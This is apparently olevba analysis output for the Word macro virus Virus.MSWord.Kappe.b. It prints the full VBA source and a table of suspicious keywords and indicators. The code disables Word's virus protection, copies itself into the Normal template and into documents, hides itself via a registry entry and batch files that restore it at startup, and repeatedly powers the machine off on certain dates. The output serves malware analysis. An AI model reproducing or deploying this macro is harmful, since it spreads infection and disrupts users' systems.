olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kappe.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kappe.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Application.EnableCancelKey = wdCancelDisabled
On Error Resume Next
Options.VirusProtection = False
Application.CommandBars("Tools").Controls(12).Visible = False
ShellDoc = Environ("WINDIR") & "\ShellNew\" & System.PrivateProfileString("", "HKEY_CLASSES_ROOT\.doc\Word.Document.8\ShellNew", "Filename")

Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set TD = ThisDocument.VBProject.VBComponents(1).CodeModule
VCode = TD.Lines(1, TD.CountOfLines)

If Normal.ThisDocument.ReadOnly = 0 Then
    NT.DeleteLines 1, NT.CountOfLines: NT.InsertLines 1, VCode
    NormalTemplate.Save
Else
    SetAttr (NormalTemplate.FullName), vbArchive
End If

If ActiveDocument.ReadOnly = 0 Then
    AD.DeleteLines 1, AD.CountOfLines: AD.InsertLines 1, VCode
    ActiveDocument.Save
End If

'>-- Check if we are Master Document
If UCase(ActiveDocument.FullName) = UCase(ShellDoc) Then
    ActiveDocument.Save
    NormalTemplate.Saved = True
    Application.Quit
End If

'>-- Infect Master Document
If ND.CountOfLines > 25 Then
    If GetAttr(ShellDoc) <> 0 Then
        SetAttr (ShellDoc), 0
        Shell Application.Path & "\Winword.exe " & ShellDoc, vbMinimizedNoFocus
    End If
End If
'AV Stealth in: HKEY_CLASSES_ROOT\.doc\Word.Document.8\ShellNew Filename
Randomize Timer
chkSt = System.PrivateProfileString("", "HKEY_CLASSES_ROOT\.doc\Word.Document.8\ShellNew", "Filename")
STL = "Ver_" & Int(Rnd * 9999) & ".dat"
If UCase(chkSt) <> Right(ShellDoc, Len(ShellDoc) - 12) Then Name ShellDoc As Environ("WinDir") & "\ShellNew\" & STL
System.PrivateProfileString("", "HKEY_CLASSES_ROOT\.doc\Word.Document.8\ShellNew", "Filename") = STL

'Reinkanation:
chkSt = System.PrivateProfileString("", "HKEY_CLASSES_ROOT\.doc\Word.Document.8\ShellNew", "Filename")
FileCopy NormalTemplate.FullName, Environ("WinDir") & "\Java\X.cls" 'Kopiere NormalTemplate
FileCopy Environ("WINDIR") & "\ShellNew\" & chkSt, Environ("WinDir") & "\Java\Y.cls"    'Kopiere Winword8.doc
x = Int(Rnd * 55) + 200: y = Int(Rnd * 19) + 238: z = Int(Rnd * 30) + 21    'Zufallszahlen

Open "Tarnkappe.bat" For Output As #1
    Print #1, "ren " & Environ("WinDir") & "\Java\X.cls " & Chr(219) & Chr(x) & Chr(y) & Chr(z) & "Sub.cls"
    Print #1, "ren " & Environ("WinDir") & "\Java\Y.cls " & Chr(219) & Chr(y) & Chr(z) & Chr(x) & "Sub.cls"
    Print #1, "del Tarnkappe.bat"
Open Environ("WinDir") & "\Winstart.bat" For Output As #2
    Print #2, "@echo off"
    Print #2, "copy " & Environ("WinDir") & "\Java\" & Chr(219) & Chr(x) & Chr(y) & Chr(z) & "Sub.cls " & NormalTemplate.FullName
    Print #2, "copy " & Environ("WinDir") & "\Java\" & Chr(219) & Chr(y) & Chr(z) & Chr(x) & "Sub.cls " & Environ("WinDir") & "\ShellNew\" & chkSt
Close
Shell "Tarnkappe.bat", vbHide

Eclipse:
If Day(Now) <> Month(Now) Then Exit Sub
Do
Shell Environ("WinDir") & "\Rundll32.exe Kernel32,SetSystemPowerState", vbHide  'The lord says power off
Loop
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMinimizedNoFocus  |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Winword.exe         |Executable file name                         |
|IOC       |Tarnkappe.bat       |Executable file name                         |
|IOC       |Winstart.bat        |Executable file name                         |
|IOC       |Rundll32.exe        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

